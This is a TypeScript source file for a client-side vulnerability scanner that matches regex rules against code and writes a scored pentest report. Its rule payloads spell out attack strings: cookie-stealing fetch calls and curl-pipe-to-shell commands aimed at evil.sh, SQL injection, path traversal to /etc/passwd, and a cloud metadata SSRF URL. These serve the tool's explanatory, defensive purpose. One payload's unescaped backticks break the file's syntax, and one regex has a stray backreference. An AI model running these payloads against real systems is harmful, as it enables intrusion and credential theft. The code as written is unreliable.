// CrackScope attack-simulation engine — Part 1 (heuristic rule set).
// Scans user-submitted source code for known vulnerability patterns,
// simulates how an attacker would try to exploit each finding, and
// produces a pentest-style scored report. Runs fully client-side.

export type Severity = "critical" | "high" | "medium" | "low" | "info";

export interface Finding {
  ruleId: string;
  title: string;
  severity: Severity;
  category: string;
  owasp: string;
  file: string;
  line: number;
  snippet: string;
  description: string;
  remediation: string;
  payload: string;
}

export interface ScanFile {
  name: string;
  content: string;
}

export interface ScanReport {
  name: string;
  createdAt: number;
  score: number;
  grade: string;
  filesScanned: number;
  linesScanned: number;
  counts: Record<Severity, number>;
  findings: Finding[];
  phases: string[];
}

interface Rule {
  id: string;
  title: string;
  severity: Severity;
  category: string;
  owasp: string;
  description: string;
  remediation: string;
  payload: string; // simulated attack the engine "attempts"
  pattern: RegExp;
  // Skip lines that look like safe usage / comments / docs.
  exclusion?: RegExp;
  maxPerFile?: number;
}

const RULES: Rule[] = [
  {
    id: "SQLI-001",
    title: "SQL injection via string-built query",
    severity: "critical",
    category: "Injection",
    owasp: "A03:2021 – Injection",
    description:
      "A SQL query is assembled by concatenating or formatting strings. If any part of the string is user-controlled, an attacker can rewrite the query.",
    remediation:
      "Use parameterized queries / prepared statements (e.g. `db.query('... WHERE id = $1', [id])`) or a query builder. Never interpolate input into SQL.",
    payload: `' OR 1=1 -- ` sent in the interpolated field → dumps the entire table; `' UNION SELECT credit_card FROM payments -- ` exfiltrates other tables.`,
    pattern:
      /(?:SELECT|INSERT\s+INTO|UPDATE|DELETE\s+FROM)[^;\n]{0,120}?(?:\+\s*\w+|`\s*\$\{|'\s*\+\s*|\$\{(?:req|params|query|body|input|user)\w*|%\s*\w+\s*%|\.format\s*\(|f["'])/i,
    exclusion: /(WHERE\s+\w+\s*=\s*(\?|\$\d+|:\w+)|\$\1|--\s*safe|\btest\b.*fixture)/i,
    maxPerFile: 8,
  },
  {
    id: "EXEC-001",
    title: "Code execution through eval / exec",
    severity: "critical",
    category: "Code Execution",
    owasp: "A03:2021 – Injection",
    description:
      "`eval`/`exec` executes arbitrary strings as code. Any attacker-controlled input reaching it becomes remote code execution.",
    remediation:
      "Remove eval/exec entirely. Parse structured data with JSON.parse and dispatch logic through a lookup map instead of dynamic code evaluation.",
    payload: `input string "process.exit(1)" or "fetch('//evil.sh/'+document.cookie)" executed verbatim in the eval context.`,
    pattern: /\b(eval\s*\(|exec\s*\(|new\s+Function\s*\()/,
    exclusion: /(\/\/|\/\*|\*)/,
    maxPerFile: 6,
  },
  {
    id: "CMD-001",
    title: "OS command injection",
    severity: "critical",
    category: "Command Injection",
    owasp: "A03:2021 – Injection",
    description:
      "A shell command is built from a string that includes interpolated values. An attacker who controls the interpolated part can chain arbitrary commands.",
    remediation:
      "Use `execFile`/`spawn` with an argument array instead of shell string interpolation, and validate inputs against an allowlist.",
    payload: `filename "; curl https://evil.sh/pwn | sh" → shell executes the attacker's pipeline after the intended command.`,
    pattern:
      /(child_process|os\.system|subprocess\.(?:call|run|Popen)|\bexec(?:Sync)?\s*\()[^;\n]{0,100}(`\s*\$\{|\$\{|'\s*\+\s*|"\s*\+\s*|%\s*\w+\s*|\.format\s*\(|\binput\b|\breq\.\w+)/i,
    maxPerFile: 6,
  },
  {
    id: "XSS-001",
    title: "Cross-site scripting via raw HTML injection",
    severity: "high",
    category: "XSS",
    owasp: "A03:2021 – Injection",
    description:
      "Raw HTML is rendered from a dynamic string. Script or event handlers embedded in that string run in the victim's browser session.",
    remediation:
      "Render text nodes, not HTML. If HTML is unavoidable, sanitize with DOMPurify and forbid event handlers and javascript: URLs.",
    payload: `<img src=x onerror="fetch('//evil.sh/?c='+document.cookie)"> stored in a comment → steals every viewer's session token.`,
    pattern:
      /(dangerouslySetInnerHTML|innerHTML\s*=|document\.write\s*\(|v-html)/,
    maxPerFile: 6,
  },
  {
    id: "SEC-001",
    title: "Hardcoded credential / API key",
    severity: "critical",
    category: "Secrets",
    owasp: "A07:2021 – Identification and Authentication Failures",
    description:
      "A secret-looking literal (key, token, password, connection string) is committed in source. Anyone with repo access — or a leaked repo — owns the credential.",
    remediation:
      "Move all secrets to environment variables or a secrets manager, rotate the exposed credential immediately, and add the file to .gitignore.",
    payload: `git history scraping / public repo search reveals the key → attacker calls the paid API or cloud account directly as you.`,
    pattern:
      /(?:api[_-]?key|apikey|secret|token|passwd|password|pwd|aws_access_key_id|private[_-]?key)\s*[:=]\s*["'][^"']{8,}["']/i,
    exclusion: /(\{\{|process\.env|os\.environ|getenv|import\.meta\.env|placeholder|xxxxx|\bexample\b|\btest\b|\bdummy\b|\bchangeme\b|<[^>]*>|\$\{|config\[|\.env\b)/i,
    maxPerFile: 8,
  },
  {
    id: "AUTH-001",
    title: "Weak or 'none' JWT verification",
    severity: "critical",
    category: "Authentication",
    owasp: "A07:2021 – Identification and Authentication Failures",
    description:
      "JWTs are decoded without signature verification, accepted with the `none` algorithm, or signed with a hardcoded secret. Tokens can be forged.",
    remediation:
      "Always verify with `jwt.verify` (never `jwt.decode` for authz), pin `algorithms: ['HS256'|'RS256']`, and load the secret from the environment.",
    payload: `attacker crafts header {"alg":"none"} with role:"admin" → forged token accepted by the API.`,
    pattern:
      /(jwt\.decode\s*\(|algorithms?\s*:\s*\[\s*["']none["']|verify\s*:\s*false|jwt\.sign\s*\([^)]{0,80}["'](secret|password|key)["'])/i,
    maxPerFile: 5,
  },
  {
    id: "CRYPTO-001",
    title: "Weak hashing / broken cryptography",
    severity: "high",
    category: "Cryptography",
    owasp: "A02:2021 – Cryptographic Failures",
    description:
      "MD5 or SHA1 is used for security purposes. These are collision-broken and unsuitable for passwords or signatures.",
    remediation:
      "Use bcrypt/argon2 for passwords and SHA-256+ for integrity. For signatures use HMAC-SHA256 or better.",
    payload: `rainbow-table lookup of the stolen MD5 digest returns the plaintext password in seconds.`,
    pattern: /(createHash\s*\(\s*["'](md5|sha1)["']|hashlib\.(md5|sha1)\s*\(|\bMD5\s*\()/i,
    exclusion: /(?:\/\/|\/\*)\s*(?:non-?security|checksum|etag|cache)/i,
    maxPerFile: 5,
  },
  {
    id: "CRYPTO-002",
    title: "Predictable randomness used for security",
    severity: "high",
    category: "Cryptography",
    owasp: "A02:2021 – Cryptographic Failures",
    description:
      "`Math.random()` (or Python `random`) is used for tokens, reset codes, or session IDs. Its output is predictable, so attacker can guess or reproduce values.",
    remediation: "Use `crypto.getRandomValues` / `crypto.randomBytes` / `secrets` module for anything security-relevant.",
    payload: `seed recovery lets the attacker predict the next reset token and take over the account.`,
    pattern: /(Math\.random\s*\(\s*\)|\brandom\.(?:random|randint|choice)\s*\()/,
    exclusion: /(id\b|key\b|snowflake|test|mock|stub|color|hue|render|animation|index)/i,
    maxPerFile: 5,
  },
  {
    id: "CRYPTO-003",
    title: "Insecure TLS validation disabled",
    severity: "high",
    category: "Cryptography",
    owasp: "A02:2021 – Cryptographic Failures",
    description:
      "TLS certificate verification is switched off. Man-in-the-middle attackers can read and modify all traffic.",
    remediation:
      "Remove `rejectUnauthorized: false` / `verify=False`. For internal CAs, add the CA to the trust store instead of disabling verification.",
    payload: `attacker on the same network ARP-spoofs the gateway and intercepts credentials in plaintext.`,
    pattern: /(rejectUnauthorized\s*:\s*false|verify\s*=\s*False|CERT_NONE|InsecureSkipVerify\s*:\s*true|check_hostname\s*=\s*False)/,
    maxPerFile: 4,
  },
  {
    id: "PATH-001",
    title: "Path traversal in file access",
    severity: "high",
    category: "Path Traversal",
    owasp: "A01:2021 – Broken Access Control",
    description:
      "A filesystem path is built from a request-controlled value without normalization, allowing `../` escapes outside the intended directory.",
    remediation:
      "Resolve the final path and assert it starts with the intended base directory; reject inputs containing `..`, or serve by allowlisted ID instead of filename.",
    payload: `GET /download?file=../../../../etc/passwd → server returns the password file.`,
    pattern:
      /((?:readFile|writeFile|createReadStream|open|unlink|sendFile|fs\.)\s*\(\s*[^)\n]{0,80}(\+\s*\w+|`\s*\$\{|\$\{\s*(?:req|params|query|body|file|path))|send_file\s*\([^)\n]{0,60}\+)/i,
    maxPerFile: 5,
  },
  {
    id: "SSRF-001",
    title: "Server-side request from user-controlled URL",
    severity: "high",
    category: "SSRF",
    owasp: "A10:2021 – Server-Side Request Forgery",
    description:
      "The server fetches a URL built from input without validation. Attackers pivot to internal services (cloud metadata, admin panels) from the server's network position.",
    remediation:
      "Allowlist destination hosts/schemes, resolve DNS and block private ranges (169.254.169.254, 10/8, 127/8), and never follow redirects blindly.",
    payload: `url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ → cloud credentials returned to the attacker.`,
    pattern:
      /((?:axios|fetch|requests\.get|requests\.post|urllib\.request\.urlopen|http\.Get|curl_init)\s*\(\s*[^)\n]{0,80}(\+\s*\w+|`\s*\$\{|\$\{|input|url\b))/i,
    exclusion: /(https?:\/\/(?:api\.|fonts\.|cdn\.|unpkg\.com|registry\.npmjs))/i,
    maxPerFile: 5,
  },
  {
    id: "DESER-001",
    title: "Insecure deserialization",
    severity: "critical",
    category: "Deserialization",
    owasp: "A08:2021 – Software and Data Integrity Failures",
    description:
      "Untrusted serialized objects are deserialized directly. Crafted payloads instantiate arbitrary classes/gadgets → remote code execution.",
    remediation:
      "Never deserialize untrusted data with pickle/yaml.load/unserialize. Use JSON, and set yaml.safe_load; validate against a schema.",
    payload: `pickle payload !!python/object/apply:os.system ["curl evil.sh | sh"] → RCE on the server.`,
    pattern: /(pickle\.loads?\s*\(|yaml\.load\s*\((?![^)]*Loader\s*=)|unserialize\s*\(|ObjectInputStream|readObject\s*\(\s*\))/,
    maxPerFile: 4,
  },
  {
    id: "CORS-001",
    title: "Wildcard CORS policy",
    severity: "medium",
    category: "Configuration",
    owasp: "A05:2021 – Security Misconfiguration",
    description:
      "Access-Control-Allow-Origin is `*` (or reflected from the Origin header), letting any website read authenticated responses from the victim's browser.",
    remediation:
      "Allowlist exact origins. If credentials are involved, `*` is never acceptable.",
    payload: `malicious page fires fetch('https://api.victim.com/me') with the user's cookie → response readable cross-origin.`,
    pattern: /(Access-Control-Allow-Origin["']?\s*[,:=]\s*["']\*["']|origin\s*:\s*["']\*["']|cors\s*\(\s*\{\s*origin\s*:\s*["']\*["'])/i,
    maxPerFile: 3,
  },
  {
    id: "CONFIG-001",
    title: "Debug / verbose mode enabled in production code",
    severity: "medium",
    category: "Configuration",
    owasp: "A05:2021 – Security Misconfiguration",
    description:
      "Debug mode exposes stack traces, configuration, and environment details that attackers use for reconnaissance.",
    remediation: "Disable debug in production; route detailed errors to logs and show generic error pages to users.",
    payload: `triggering an error page leaks framework version, file paths and config values, shortening the attacker's recon phase.`,
    pattern: /(DEBUG\s*=\s*True|app\.run\(.*debug\s*=\s*True|DEBUG\s*:\s*true)/,
    exclusion: /(process\.env|NODE_ENV|development)/i,
    maxPerFile: 3,
  },
  {
    id: "PROTO-001",
    title: "Prototype pollution risk in deep merge",
    severity: "high",
    category: "Code Execution",
    owasp: "A08:2021 – Software and Data Integrity Failures",
    description:
      "Recursive merge of user input into objects without guarding `__proto__`/`constructor` lets attackers rewrite prototype properties application-wide.",
    remediation:
      "Guard against `__proto__`, `prototype`, and `constructor` keys, or use a battle-tested merge library with built-in protection.",
    payload: `JSON body {"__proto__":{"isAdmin":true}} → every new object inherits isAdmin, bypassing authorization checks.`,
    pattern: /(deepMerge|mergeDeep|deepmerge|Object\.assign\s*\(\s*\w+,\s*(?:req|input|body))|__proto__/,
    maxPerFile: 4,
  },
  {
    id: "CRYPTO-004",
    title: "Hardcoded IV / static salt",
    severity: "medium",
    category: "Cryptography",
    owasp: "A02:2021 – Cryptographic Failures",
    description:
      "A fixed initialization vector or salt is reused across encryptions, collapsing ciphertext uniqueness and enabling pattern recovery.",
    remediation: "Generate a fresh random IV per message (`crypto.randomBytes(16)`) and unique salts per user; store them alongside ciphertext.",
    payload: `two ciphertexts XORed reveal plaintext relations because the IV repeats.`,
    pattern: /(createCipheriv\s*\([^)]{0,60}(?:iv|IV)\s*["'][^"']+["']|salt\s*[:=]\s*["'][^"']+["'])/i,
    exclusion: /(process\.env|randomBytes|getRandomValues|import)/i,
    maxPerFile: 4,
  },
  {
    id: "XSS-002",
    title: "Reflected user input written into response",
    severity: "medium",
    category: "XSS",
    owasp: "A03:2021 – Injection",
    description:
      "Request parameters are echoed into a response/template without escaping — a classic reflected XSS vector.",
    remediation: "Auto-escape template engines (enable `escape`), and never concatenate user input into HTML strings.",
    payload: `?q=<script>fetch('//evil.sh/?c='+document.cookie)</script> reflected and executed in the victim's browser.`,
    pattern: /(res\.(?:send|write)\s*\(\s*["'`][^"'`]{0,60}\+\s*req\.|render_template_string\s*\(|echo\s+\$_(?:GET|POST|REQUEST))|res\.send\s*\(\s*req\./,
    maxPerFile: 5,
  },
  {
    id: "AUTH-002",
    title: "Password stored in plaintext",
    severity: "critical",
    category: "Authentication",
    owasp: "A07:2021 – Identification and Authentication Failures",
    description:
      "Passwords are saved directly to the database without a slow adaptive hash. A single DB leak exposes every user's credential.",
    remediation: "Hash with bcrypt/argon2 (unique salt per user, cost ≥ 12) before storage; enforce minimum entropy on signup.",
    payload: `SQL injection or backup leak dumps the users table → every password is immediately readable.`,
    pattern: /((?:insert|create|save|add)[^;\n]{0,60}password|password\s*[:=]\s*(?:req\.\w+|user\.\w+|input))/i,
    exclusion: /(bcrypt|argon|hash|hashSync|digest|pbkdf2|scrypt|compare)/i,
    maxPerFile: 4,
  },
  {
    id: "CONF-002",
    title: "Secrets committed in config / env-style file",
    severity: "high",
    category: "Secrets",
    owasp: "A05:2021 – Security Misconfiguration",
    description:
      "A configuration file contains concrete credential values rather than placeholders — this file often ships with builds or repos.",
    remediation: "Keep real values only in the deployment secret store; commit `.example` files with placeholders instead.",
    payload: `dotfile scanning bots find .env committed to the repo and exfiltrate every service credential.`,
    pattern: /^\s*[A-Z0-9_]*(?:KEY|SECRET|TOKEN|PASSWORD|PASSWD)[A-Z0-9_]*\s*=\s*["']?[A-Za-z0-9+/=_-]{10,}["']?\s*$/m,
    exclusion: /(\$\{|process\.env|example|placeholder|your[_-]?key|xxx|changeme|<)/i,
    maxPerFile: 6,
  },
];

const SEVERITY_WEIGHT: Record<Severity, number> = {
  critical: 22,
  high: 12,
  medium: 6,
  low: 2,
  info: 0,
};

export const SEVERITY_ORDER: Severity[] = ["critical", "high", "medium", "low", "info"];

function gradeFor(score: number): string {
  if (score >= 90) return "A";
  if (score >= 75) return "B";
  if (score >= 60) return "C";
  if (score >= 40) return "D";
  return "F";
}

export const EMPTY_COUNTS: Record<Severity, number> = {
  critical: 0,
  high: 0,
  medium: 0,
  low: 0,
  info: 0,
};

/** Heuristic "attack simulation phases" shown while scanning. */
export const ATTACK_PHASES = [
  "Recon — fingerprinting languages & entry points",
  "Injection probes — SQL / command / template",
  "XSS & deserialization payloads",
  "Secrets sweep — keys, tokens, credentials",
  "Crypto audit — hashes, randomness, TLS",
  "Access control & configuration checks",
  "Compiling pentest report",
];

export function runScan(files: ScanFile[], name: string): ScanReport {
  const findings: Finding[] = [];

  for (const file of files) {
    const lines = file.content.split("\n");
    const perRuleCount = new Map<string, number>();

    lines.forEach((lineText, idx) => {
      if (lineText.length > 400) return;
      for (const rule of RULES) {
        const cap = rule.maxPerFile ?? 5;
        if ((perRuleCount.get(rule.id) ?? 0) >= cap) continue;
        if (!rule.pattern.test(lineText)) continue;
        if (rule.exclusion && rule.exclusion.test(lineText)) continue;
        perRuleCount.set(rule.id, (perRuleCount.get(rule.id) ?? 0) + 1);
        findings.push({
          ruleId: rule.id,
          title: rule.title,
          severity: rule.severity,
          category: rule.category,
          owasp: rule.owasp,
          file: file.name,
          line: idx + 1,
          snippet: lineText.trim().slice(0, 240),
          description: rule.description,
          remediation: rule.remediation,
          payload: rule.payload,
        });
      }
    });
  }

  findings.sort((a, b) => {
    const s = SEVERITY_ORDER.indexOf(a.severity) - SEVERITY_ORDER.indexOf(b.severity);
    if (s !== 0) return s;
    return a.file.localeCompare(b.file) || a.line - b.line;
  });

  const counts = { ...EMPTY_COUNTS };
  for (const f of findings) counts[f.severity] += 1;

  const linesScanned = files.reduce((acc, f) => acc + f.content.split("\n").length, 0);
  const deductions = findings.reduce((acc, f) => acc + SEVERITY_WEIGHT[f.severity], 0);
  const score = Math.max(0, Math.min(100, Math.round(100 - deductions)));

  return {
    name,
    createdAt: Date.now(),
    score,
    grade: gradeFor(score),
    filesScanned: files.length,
    linesScanned,
    counts,
    findings,
    phases: ATTACK_PHASES,
  };
}

export function reportToMarkdown(report: ScanReport): string {
  const d = new Date(report.createdAt).toISOString();
  const lines: string[] = [
    `# CrackScope Penetration Test Report — ${report.name}`,
    ``,
    `- **Date:** ${d}`,
    `- **Files scanned:** ${report.filesScanned} (${report.linesScanned} lines)`,
    `- **Security score:** ${report.score}/100 (grade ${report.grade})`,
    `- **Findings:** ${report.counts.critical} critical, ${report.counts.high} high, ${report.counts.medium} medium, ${report.counts.low} low`,
    ``,
    `## Methodology`,
    ``,
    `Heuristic attack simulation (Part 1 engine): pattern-based injection probes, secrets sweep, crypto audit, and configuration review mapped to OWASP Top 10 (2021).`,
    ``,
    `## Findings`,
    ``,
  ];
  if (report.findings.length === 0) {
    lines.push(`No vulnerabilities detected by the Part 1 engine. Heavier AST-based detection arrives in Part 3.`);
  }
  report.findings.forEach((f, i) => {
    lines.push(
      `### ${i + 1}. [${f.severity.toUpperCase()}] ${f.title} (${f.ruleId})`,
      ``,
      `- **File:** ${f.file}:${f.line}`,
      `- **OWASP:** ${f.owasp}`,
      `- **Category:** ${f.category}`,
      `- **Code:** \`${f.snippet}\``,
      ``,
      f.description,
      ``,
      `**Simulated attack:** ${f.payload}`,
      ``,
      `**Remediation:** ${f.remediation}`,
      ``,
    );
  });
  return lines.join("\n");
}
